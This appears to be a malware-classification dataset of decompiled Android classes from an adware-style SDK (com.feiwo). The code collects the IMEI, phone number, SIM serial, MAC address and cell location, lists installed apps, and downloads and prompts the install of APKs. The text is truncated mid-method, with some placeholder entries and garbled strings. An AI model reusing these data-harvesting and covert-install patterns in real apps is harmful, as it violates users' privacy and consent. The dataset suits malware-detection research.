"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\d.code","final class d extends i {   final Context f173a;   public d(  Context context){     this.f173a=context;   }   @Override public void a(  AdInfo adInfo,  String str){     super.a(adInfo,str);     c.a(this.f173a,adInfo.getAdId().intValue(),true,false,false,false,0,adInfo.getPackageName(),str,adInfo);   }   @Override public void a(  AdInfo adInfo,  String str,  int i){     super.a(adInfo,str,i);     c.a(this.f173a,adInfo.getAdId().intValue(),false,true,false,false,i,adInfo.getPackageName(),str,adInfo);   }   @Override public void a(  AdInfo adInfo,  String str,  boolean z,  Drawable drawable){     c.a(this.f173a,adInfo.getAdId().intValue(),false,false,true,z,100,adInfo.getPackageName(),str,adInfo);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\e.code","public class e {   protected static Field a(  Class cls,  String str){     while (cls != Object.class) {       try {         return cls.getDeclaredField(str);       }  catch (      NoSuchFieldException e) {         cls=cls.getSuperclass();       }     }     return null;   }   protected static Field a(  Object obj,  String str){     return a((Class)obj.getClass(),str);   }   public static void a(  Object obj,  String str,  Object obj2){     Field a2=a(obj,str);     if (a2 == null) {       throw new IllegalArgumentException(""Could not find field ["" + str + ""] on target [""+ obj+ ""]"");     }     a(a2);     try {       a2.set(obj,obj2);     }  catch (    IllegalAccessException e) {       Log.e(""zbkc"","""",e);     }   }   protected static void a(  Field field){     if (Modifier.isPublic(field.getModifiers()) && Modifier.isPublic(field.getDeclaringClass().getModifiers())) {       return;     }     field.setAccessible(true);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\f.code","public class f {   private static f f174a;   private String f175b;   private String c;   private String d;   private String e;   private String f;   private f(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       String networkOperator=telephonyManager.getNetworkOperator();       this.f175b=networkOperator.substring(0,3);       this.c=networkOperator.substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(cdmaCellLocation.getBaseStationId());         this.e=String.valueOf(cdmaCellLocation.getNetworkId());         this.f=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(gsmCellLocation.getCid());         this.e=String.valueOf(gsmCellLocation.getLac());         this.f=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static f a(  Context context){     if (f174a == null) {       f174a=new f(context);     }     return f174a;   }   public String a(){     return this.c;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@31f57e09"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\h.code","public class h {   static h f176a;   private final String f177b=com.feiwo.i.c.a.ca;   private Map<String,j> c=new ConcurrentHashMap();   private ConcurrentLinkedQueue<j> d=new ConcurrentLinkedQueue<>();   private Context e;   private h(  Context context){     this.e=context;   }   public static h a(  Context context){     if (f176a == null) { synchronized (h.class) {         if (f176a == null) {           f176a=new h(context);         }       }     }     return f176a;   }   public void a(  j jVar){     if (this.d.contains(jVar)) {       return;     }     this.d.add(jVar);   }   public j a(  String str,  AdInfo adInfo){     return this.c.get(str + adInfo.getUrl());   }   public void a(){     j poll=this.d.poll();     while (poll != null) {       j.a(poll).isRetryTask=true;       a(j.b(poll),j.c(poll),j.d(poll),j.a(poll),(i)j.e(poll).poll());       poll=this.d.poll();     }   }   public void a(  int i,  String str,  AdInfo adInfo,  i iVar){     a(i,str,adInfo,new DownInfo(),iVar);   }   public void a(  int i,  String str,  AdInfo adInfo,  DownInfo downInfo,  i iVar){     j a2=a(str,adInfo);     if (a2 != null) {       a2.a(iVar);       return;     }     j jVar=new j(this,i,str,adInfo,downInfo,iVar);     this.c.put(str + adInfo.getUrl(),jVar);     jVar.start();     if (i == 1) {       s.a(this.e,9999459 + adInfo.getAdId().intValue());     }     com.feiwo.d.a.a aVar=com.feiwo.d.e.c(this.e,i).e;     if (aVar != null) {       boolean z=downInfo.isRetryTask;       j.a(jVar).startDownload=downInfo.startDownload;       Iterator<j> it=this.d.iterator();       boolean z2=z;       while (it.hasNext()) {         j next=it.next();         if (j.b(next) == i && j.d(next).getAdId().intValue() == adInfo.getAdId().intValue()) {           z2=true;         }       }       if (z2) {         return;       }       AppInfo appInfo=com.feiwo.d.e.b(com.feiwo.d.e.a(this.e)).downloadAppInfo.get(adInfo.getPackageName());       if (appInfo == null) {         j.a(jVar).startDownload=true;         aVar.a(this.e,adInfo,5,null);         return;       }       long a3=appInfo == null ? 0L : v.a(appInfo.getDownloadTime().longValue());       if (appInfo.getAdType() != i || a3 > 1800000) {         j.a(jVar).startDownload=true;         aVar.a(this.e,adInfo,5,null);       }     }   }   public void b(  String str,  AdInfo adInfo){     this.c.remove(str + adInfo.getUrl());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\i.code","public class i {   public void a(  AdInfo adInfo,  String str){   }   public void a(  AdInfo adInfo,  String str,  int i){   }   public void a(  AdInfo adInfo,  String str,  boolean z,  Drawable drawable){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\j.code","public class j extends Thread {   final h f178a;   private Queue<i> f179b;   private int c;   private AppInfo d;   private String e;   private AdInfo f;   private String g;   private DownInfo h;   private long j;   private Drawable n;   private long k=0;   private long l=0;   private int m=0;   private Handler i=new Handler();   public j(  h hVar,  int i,  String str,  AdInfo adInfo,  DownInfo downInfo,  i iVar){     Context context;     this.f178a=hVar;     this.c=i;     this.d=new AppInfo(i);     this.h=downInfo;     this.e=str;     this.f=adInfo;     p a2=p.a();     context=hVar.e;     this.g=a2.a(context,com.feiwo.c.a.r,str + adInfo.getUrl());     this.f179b=new ConcurrentLinkedQueue();     a(iVar);     if (this.n != null || this.i == null) {       return;     }     this.i.post(new k(this,hVar,downInfo,i,adInfo,str));   }   public static DownInfo a(  j jVar){     return jVar.h;   }   public static int b(  j jVar){     return jVar.c;   }   public static String c(  j jVar){     return jVar.e;   }   public static AdInfo d(  j jVar){     return jVar.f;   }   public static Queue e(  j jVar){     return jVar.f179b;   }   void a(){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.i.j.a():void"");   }   void a(  int i){     b(i);   }   public void a(  i iVar){     if (iVar != null) {       this.f179b.add(iVar);     }   }   void a(  boolean z){     this.i.post(new m(this));   }   void a(  boolean z,  boolean z2,  String str){     if (this.i == null) {       return;     }     this.i.post(new n(this,z,str,z2));   }   void b(  int i){     Context context;     Context context2;     Context context3;     Context context4;     Context context5;     this.d.setAdInfo(this.f);     this.d.setProgress(i);     this.d.setBeiginTime(this.j);     if (this.i != null) {       this.i.post(new o(this,i));       return;     }     Iterator it=new ArrayList(this.f179b).iterator();     while (it.hasNext()) {       ((i)it.next()).a(this.f,this.g,i);     }     if (this.h.isSilent) {       return;     }     context=this.f178a.e;     if (com.feiwo.d.e.c(context,this.c) == null) {       context4=this.f178a.e;       com.feiwo.d.e eVar=(com.feiwo.d.e)com.feiwo.d.e.b(context4,this.c);       context5=this.f178a.e;       com.feiwo.d.e.a(context5,eVar,this.c);     }     context2=this.f178a.e;     com.feiwo.d.a.a aVar=com.feiwo.d.e.c(context2,this.c).e;     context3=this.f178a.e;     aVar.a(context3,this.d,this.n);   }   @Override public void run(){     try {       a();     }  catch (    Exception e) {       e.printStackTrace();     }     this.f178a.b(this.e,this.f);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\k.code","class k implements Runnable {   final h f180a;   final DownInfo f181b;   final int c;   final AdInfo d;   final String e;   final j f;   public k(  j jVar,  h hVar,  DownInfo downInfo,  int i,  AdInfo adInfo,  String str){     this.f=jVar;     this.f180a=hVar;     this.f181b=downInfo;     this.c=i;     this.d=adInfo;     this.e=str;   }   @Override public void run(){     Context context;     Context context2;     if (!this.f181b.isSilent && this.c != 4 && this.f181b.startDownload) {       context2=this.f.f178a.e;       Toast.makeText(context2,this.d.getAppName() + com.feiwo.i.c.a.n,0).show();     }     com.feiwo.i.b.a a2=com.feiwo.i.b.a.a();     context=this.f.f178a.e;     a2.a(context,this.e,this.d.getIcon(),new l(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\l.code","class l implements com.feiwo.i.b.d {   final k f182a;   public l(  k kVar){     this.f182a=kVar;   }   @Override public void a(  Drawable drawable,  String str){     if (drawable != null) {       this.f182a.f.n=drawable;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\m.code","public class m implements Runnable {   final j f183a;   public m(  j jVar){     this.f183a=jVar;   }   @Override public void run(){     Queue queue;     AdInfo adInfo;     String str;     queue=this.f183a.f179b;     for (    i iVar : new ArrayList(queue)) {       adInfo=this.f183a.f;       str=this.f183a.g;       iVar.a(adInfo,str);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\n.code","public class n implements Runnable {   final boolean f184a;   final String f185b;   final boolean c;   final j d;   public n(  j jVar,  boolean z,  String str,  boolean z2){     this.d=jVar;     this.f184a=z;     this.f185b=str;     this.c=z2;   }   @Override public void run(){     Queue queue;     DownInfo downInfo;     Context context;     int i;     Context context2;     int i2;     Context context3;     DownInfo downInfo2;     AdInfo adInfo;     Drawable drawable;     Context context4;     int i3;     Context context5;     int i4;     AdInfo adInfo2;     String str;     Drawable drawable2;     queue=this.d.f179b;     for (    i iVar : new ArrayList(queue)) {       adInfo2=this.d.f;       str=this.d.g;       boolean z=this.f184a;       drawable2=this.d.n;       iVar.a(adInfo2,str,z,drawable2);     }     downInfo=this.d.h;     if (downInfo.isSilent) {       return;     }     context=this.d.f178a.e;     i=this.d.c;     if (com.feiwo.d.e.c(context,i) == null) {       context4=this.d.f178a.e;       i3=this.d.c;       com.feiwo.d.e eVar=(com.feiwo.d.e)com.feiwo.d.e.b(context4,i3);       context5=this.d.f178a.e;       i4=this.d.c;       com.feiwo.d.e.a(context5,eVar,i4);     }     context2=this.d.f178a.e;     i2=this.d.c;     com.feiwo.d.a.a aVar=com.feiwo.d.e.c(context2,i2).e;     context3=this.d.f178a.e;     downInfo2=this.d.h;     boolean z2=downInfo2.isSilent;     adInfo=this.d.f;     String str2=this.f184a ? this.d.g : """";     drawable=this.d.n;     aVar.a(context3,z2,adInfo,str2,drawable,this.f185b,this.c);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\o.code","public class o implements Runnable {   final int f186a;   final j f187b;   public o(  j jVar,  int i){     this.f187b=jVar;     this.f186a=i;   }   @Override public void run(){     Queue queue;     DownInfo downInfo;     Context context;     int i;     Context context2;     int i2;     Context context3;     AppInfo appInfo;     Drawable drawable;     Context context4;     int i3;     Context context5;     int i4;     AdInfo adInfo;     String str;     queue=this.f187b.f179b;     for (    i iVar : new ArrayList(queue)) {       adInfo=this.f187b.f;       str=this.f187b.g;       iVar.a(adInfo,str,this.f186a);     }     downInfo=this.f187b.h;     if (downInfo.isSilent) {       return;     }     context=this.f187b.f178a.e;     i=this.f187b.c;     if (com.feiwo.d.e.c(context,i) == null) {       context4=this.f187b.f178a.e;       i3=this.f187b.c;       com.feiwo.d.e eVar=(com.feiwo.d.e)com.feiwo.d.e.b(context4,i3);       context5=this.f187b.f178a.e;       i4=this.f187b.c;       com.feiwo.d.e.a(context5,eVar,i4);     }     context2=this.f187b.f178a.e;     i2=this.f187b.c;     com.feiwo.d.a.a aVar=com.feiwo.d.e.c(context2,i2).e;     context3=this.f187b.f178a.e;     appInfo=this.f187b.d;     drawable=this.f187b.n;     aVar.a(context3,appInfo,drawable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\p.code","public class p {   private static p f188b;   private final String f189a=p.class.getSimpleName();   public static p a(){     if (f188b == null) {       f188b=new p();     }     return f188b;   }   public String a(  Context context,  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(context.getFilesDir().getAbsolutePath());     if (!str.startsWith(""/"")) {       stringBuffer.append(""/"");     }     stringBuffer.append(str);     File file=new File(stringBuffer.toString());     if (!file.exists()) {       file.mkdirs();     }     return stringBuffer.toString();   }   public String a(  Context context,  String str,  String str2){     String b2=a().b(str2);     return a().b() ? a().a(str) + ""/"" + b2 : a().a(context,"""") + ""/"" + b2;   }   public String a(  String str){     if (!b()) {       return null;     }     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(Environment.getExternalStorageDirectory());     if (!str.startsWith(""/"")) {       stringBuffer.append(""/"");     }     stringBuffer.append(str);     File file=new File(stringBuffer.toString());     if (file.exists() || file.mkdirs()) {       return stringBuffer.toString();     }     return null;   }   public String b(  String str){     return str.replace("":"",""_"").replace(""/"",""_"");   }   public boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   }   public void c(  String str){     File file=new File(str);     if (file.exists()) {       file.delete();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\q.code","public class q {   static final String f190a=q.class.getSimpleName();   public static Intent a(  Context context,  IntentData intentData){     Intent intent=new Intent(context,(Class<?>)PA.class);     intent.putExtra(a.f156a,intentData);     if (!(context instanceof Activity)) {       intent.setFlags(268435456);     }     return intent;   }   public static IntentData a(  int i,  AdInfo adInfo){     IntentData intentData=new IntentData(i,a.c);     intentData.setAdInfo(adInfo);     return intentData;   }   public static IntentData a(  int i,  String str,  AdInfo adInfo,  boolean z){     IntentData intentData=new IntentData(i,a.d);     intentData.setBaseUrl(str);     intentData.setAdInfo(adInfo);     intentData.setSendClick(z);     return intentData;   }   public static List<Map<String,String>> a(  Context context){     int i=0;     String str=com.feiwo.i.c.a.bh;     ArrayList arrayList=new ArrayList();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return arrayList;       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         HashMap hashMap=new HashMap();         hashMap.put(str,packageInfo.packageName);         arrayList.add(hashMap);       }       i=i2 + 1;     }   }   public static void a(  Context context,  String str){     if (TextUtils.isEmpty(str)) {       return;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e) {       e.printStackTrace();     }     context.startActivity(intent);   }   public static Intent b(  Context context,  String str){     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive"");     return intent;   }   public static void c(  Context context,  String str){     Intent launchIntentForPackage=context.getPackageManager().getLaunchIntentForPackage(str);     if (launchIntentForPackage != null) {       context.startActivity(launchIntentForPackage);     }   }   public static String d(  Context context,  String str){     if (context == null || context.getPackageManager() == null) {       return """";     }     for (    PackageInfo packageInfo : context.getPackageManager().getInstalledPackages(0)) {       if ((packageInfo.applicationInfo.flags & 1) == 0 && packageInfo.packageName.equals(str)) {         return packageInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();       }     }     return """";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\r.code","public class r {   private static long f191a=0;   public static void a(  String str,  Object obj){   }   public static void a(  String str,  String str2,  Object obj){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\s.code","public class s {   private static final String f192a=s.class.getSimpleName();   private static ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a2=a(viewGroup.getChildAt(childCount - 1));       if (a2 != null && a2.getId() == 16908294) {         return a2;       }     }     return null;   }   public static void a(  Context context,  int i){     ((NotificationManager)context.getSystemService(""notification"")).cancel(i);   }   public static void a(  Context context,  NotificationInfo notificationInfo){     NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");     Notification notification=new Notification(notificationInfo.pushIcon != -1 ? notificationInfo.pushIcon : notificationInfo.isDownloading ? R.drawable.stat_sys_download : R.drawable.stat_sys_download_done,notificationInfo.pushContent,notificationInfo.notiTime);     notification.flags=notificationInfo.notiFlag;     if (notification.flags == 32) {       notification.flags=notificationInfo.notiFlag | 2;     }     notification.setLatestEventInfo(context,notificationInfo.notiTitle,notificationInfo.notiContent,PendingIntent.getActivity(context,notificationInfo.notiId,notificationInfo.notiIntent,134217728));     if (notificationInfo.notiIcon != null) {       ImageView a2=a(View.inflate(context,notification.contentView.getLayoutId(),null));       Bitmap a3=com.feiwo.i.b.e.a(notificationInfo.notiIcon);       int a4=com.feiwo.i.b.e.a(context,45.0f);       notification.contentView.setImageViewBitmap(a2.getId(),com.feiwo.i.b.e.a(a3,a4,a4));     }     notificationManager.notify(notificationInfo.notiId,notification);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\t.code","public class t {   private static t f193a;   private TelephonyManager f194b;   private Context c;   public t(  Context context){     this.f194b=(TelephonyManager)context.getSystemService(""phone"");     this.c=context;   }   public static t a(  Context context){     if (f193a == null) {       f193a=new t(context);     }     return f193a;   }   public static String b(  Context context){     return context.getPackageName();   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static ScreenSize d(  Context context){     ScreenSize screenSize=new ScreenSize();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     screenSize.setScreenWidth(displayMetrics.widthPixels);     screenSize.setScreenHeight(displayMetrics.heightPixels);     return screenSize;   }   public static String d(){     try {       return TextUtils.isEmpty("""") ? Build.MANUFACTURER : """";     }  catch (    Exception e) {       return """";     }   }   public static String e(){     try {       return TextUtils.isEmpty("""") ? Build.MODEL : """";     }  catch (    Exception e) {       return """";     }   }   public static String f(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   }   public String a(){     String str;     try {       str=this.f194b.getDeviceId();     }  catch (    Exception e) {       str=null;     }     return TextUtils.isEmpty(str) ? c(this.c) : str;   }   public String b(){     try {       return this.f194b.getLine1Number();     }  catch (    Exception e) {       return """";     }   }   public String c(){     try {       return this.f194b.getSimSerialNumber();     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\u.code","!org.eclipse.jdt.core.dom.TypeDeclaration@15b21c25"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\v.code","public class v {   private static final String f195a=v.class.getSimpleName();   public static long a(){     return System.currentTimeMillis();   }   public static long a(  long j){     return a() - j;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\w.code","public class w {   @SuppressLint({""NewApi""}) public static GradientDrawable a(  int i,  int i2,  boolean z){     GradientDrawable gradientDrawable=new GradientDrawable();     gradientDrawable.setCornerRadius(i2);     if (z) {       gradientDrawable.setGradientRadius(60.0f);       gradientDrawable.setColors(new int[]{Color.parseColor(""#dce7da""),-1});       gradientDrawable.setGradientType(0);     }  else {       gradientDrawable.setColor(i);     }     return gradientDrawable;   }   public static LayerDrawable a(){     GradientDrawable gradientDrawable=new GradientDrawable();     gradientDrawable.setCornerRadius(0.0f);     gradientDrawable.setColor(Color.rgb(83,189,76));     return new LayerDrawable(new ClipDrawable[]{new ClipDrawable(gradientDrawable,2,1)});   }   public static StateListDrawable a(  Drawable drawable,  Drawable drawable2){     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed,R.attr.state_enabled},drawable);     stateListDrawable.addState(new int[0],drawable2);     return stateListDrawable;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.a\a.code","public class a {   private static HttpClient f158a;   public static synchronized HttpClient a(){     HttpClient httpClient; synchronized (a.class) {       if (f158a == null) {         BasicHttpParams basicHttpParams=new BasicHttpParams();         HttpProtocolParams.setVersion(basicHttpParams,HttpVersion.HTTP_1_1);         HttpProtocolParams.setContentCharset(basicHttpParams,""UTF-8"");         HttpProtocolParams.setUseExpectContinue(basicHttpParams,true);         HttpProtocolParams.setUserAgent(basicHttpParams,com.feiwo.c.a.e);         ConnManagerParams.setTimeout(basicHttpParams,10000L);         HttpConnectionParams.setConnectionTimeout(basicHttpParams,f.f11a);         HttpConnectionParams.setSoTimeout(basicHttpParams,f.f11a);         SchemeRegistry schemeRegistry=new SchemeRegistry();         schemeRegistry.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),80));         schemeRegistry.register(new Scheme(""https"",SSLSocketFactory.getSocketFactory(),443));         f158a=new DefaultHttpClient(new ThreadSafeClientConnManager(basicHttpParams,schemeRegistry),basicHttpParams);       }       httpClient=f158a;     }     return httpClient;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.a\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@83605ed"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.a\c.code","public class c {   public int f160a;   public Exception f161b;   public String c;   public byte[] d;   public int e; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.a\d.code","public class d {   private static d f162a=null;   private ExecutorService f163b;   private d(){     this.f163b=null;     this.f163b=Executors.newFixedThreadPool(15);   }   public static d a(){     if (f162a == null) {       f162a=new d();     }     return f162a;   }   public void a(  Runnable runnable){     this.f163b.submit(runnable);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.a\e.code","public class e {   private final String f164a=e.class.getSimpleName();   private Context f165b;   private int c;   public e(  Context context,  int i){     a(context);     a(i);   }   public Context a(){     return this.f165b;   }   public c a(  String str,  String str2,  i iVar){     int b2=b();     if (iVar.f() != null && iVar.f().getAd() != null && iVar.f().getAd().getAdType() != null) {       b2=iVar.f().getAd().getAdType().intValue();     }     return b.a(a(),str + str2 + b2,iVar);   }   public void a(  int i){     this.c=i;   }   public void a(  Context context){     this.f165b=context;   }   public int b(){     return this.c;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\a.code","public class a {   private static a f166a;   private Map<String,SoftReference<Drawable>> f167b=new HashMap();   private int c=0;   private int d=0;   private a(){   }   private int a(  Context context){     if (this.c > 0) {       return this.c;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     this.c=displayMetrics.widthPixels;     return this.c;   }   private Drawable a(  Context context,  String str,  String str2){     if (str == null || str.equals("""")) {       return null;     }     File file=new File(str2);     if (!file.exists()) {       return null;     }     try {       file.setLastModified(System.currentTimeMillis());       return new BitmapDrawable(b(context,str,str2));     }  catch (    Exception e) {       e.printStackTrace();       return null;     } catch (    OutOfMemoryError e2) {       e2.printStackTrace();       return null;     }   }   public static a a(){     if (f166a == null) { synchronized (a.class) {         if (f166a == null) {           f166a=new a();         }       }     }     return f166a;   }   private int b(  Context context){     if (this.d > 0) {       return this.d;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     this.d=displayMetrics.heightPixels;     return this.d;   }   public Bitmap b(  Context context,  String str,  String str2){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str2,options);     int i=options.outWidth;     int i2=options.outHeight;     int b2=(i <= i2 || i <= a(context)) ? (i >= i2 || i2 <= b(context)) ? 1 : options.outHeight / b(context) : options.outWidth / a(context);     if (b2 <= 0) {       b2=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=b2;     options.inJustDecodeBounds=false;     if (new File(str2).exists()) {       return BitmapFactory.decodeFile(str2,options);     }     return null;   }   public Drawable a(  Context context,  String str,  String str2,  d dVar){     if (TextUtils.isEmpty(str2) || TextUtils.isEmpty(str)) {       return null;     }     return a(context,str,str2,p.a().a(context,com.feiwo.c.a.F,str + str2),true,dVar);   }   public Drawable a(  Context context,  String str,  String str2,  String str3,  boolean z,  d dVar){     SoftReference<Drawable> softReference;     Drawable drawable;     String str4=str + str2;     if (str4 == null || TextUtils.isEmpty(str4) || str3 == null || TextUtils.isEmpty(str3)) {       if (dVar != null) {         dVar.a(null,str4);       }       r.a(""loadImage"",""èŽ·å�–å›¾ç‰‡å�‚æ•°å¼‚å¸¸ imageUrl = "" + str4 + ""   imageCachePath = ""+ str3);       return null;     }     String substring=str4.substring(str4.lastIndexOf(""/"") + 1,str4.length());     if (z && this.f167b.containsKey(str4) && (drawable=(softReference=this.f167b.get(substring)).get()) != null) {       if (a(drawable,str4,str3,dVar)) {         return softReference.get();       }       return null;     }     Drawable a2=a(context,str4,str3);     if (a2 == null) {       if (Build.VERSION.SDK_INT < 11) {         new b(this,context).execute(str,str2,str3,""true"",dVar,String.valueOf(z));       }  else {         new b(this,context).executeOnExecutor(new ThreadPoolExecutor(5,10,10L,TimeUnit.SECONDS,new LinkedBlockingQueue()),str,str2,str3,""true"",dVar,String.valueOf(z));       }       return null;     }     if (dVar != null) {       a(a2,str4,str3,dVar);     }     if (!z) {       return a2;     }     this.f167b.put(substring,new SoftReference<>(a2));     return a2;   }   public boolean a(  Drawable drawable,  String str,  String str2,  d dVar){     if (dVar == null || drawable.getIntrinsicHeight() > 0 || drawable.getIntrinsicWidth() > 0) {       dVar.a(drawable,str);       return true;     }     dVar.a(null,str);     p.a().c(str2);     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i.b\b.code","public class b extends AsyncTask<Object,Integer,Bitmap> {   final a f168a;   private String f169b;   private String c;   private String d;   private String e;   private String f;   private c g;   private d h;   private Context i;   public b(  a aVar,  Context context){     this.f168a=aVar;     this.i=context;   }   public Bitmap a(  String str,  String str2,  String str3,  String str4){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2;     Bitmap b2;     Map map;     File file=new File(str3);     try {       if (!file.exists()) {         try {           httpURLConnection=com.feiwo.i.a.b.a(this.i,str + str2);           try {             httpURLConnection.setConnectTimeout(b.a.a.f.f11a);             httpURLConnection.setReadTimeout(b.a.a.f.f11a);             httpURLConnection.setRequestMethod(""GET"");             httpURLConnection.connect();             InputStream inputStream=httpURLConnection.getInputStream();             fileOutputStream2=new FileOutputStream(file);             try {               byte[] bArr=new byte[1024];               while (true) {                 int read=inputStream.read(bArr);                 if (read == -1) {                   break;                 }                 fileOutputStream2.write(bArr,0,read);               }               fileOutputStream2.flush();               fileOutputStream2.close();               inputStream.close();               b2=this.f168a.b(this.i,str + str2,str3);               if (TextUtils.isEmpty(str4) && TextUtils.equals(""isUseCache"",""true"")) {                 SoftReference softReference=new SoftReference(new BitmapDrawable(b2));                 map=this.f168a.f167b;                 map.put(str3.substring(str3.lastIndexOf(""/"") + 1,str3.length()),softReference);               }               if (fileOutputStream2 != null) {                 try {                   fileOutputStream2.close();                 }  catch (                IOException e) {                   e.printStackTrace();                   return b2;                 }               }               if (file != null) {               }               if (httpURLConnection == null) {                 return b2;               }               httpURLConnection.disconnect();               return b2;             }  catch (            FileNotFoundException e2) {               e=e2;               e.printStackTrace();               if (fileOutputStream2 != null) {                 try {                   fileOutputStream2.close();                 }  catch (                IOException e3) {                   e3.printStackTrace();                 }               }               if (file != null) {               }               if (httpURLConnection != null) {                 httpURLConnection.disconnect();               }               return null;             } catch (            ConnectException e4) {               e=e4;               e.printStackTrace();               if (fileOutputStream2 != null) {                 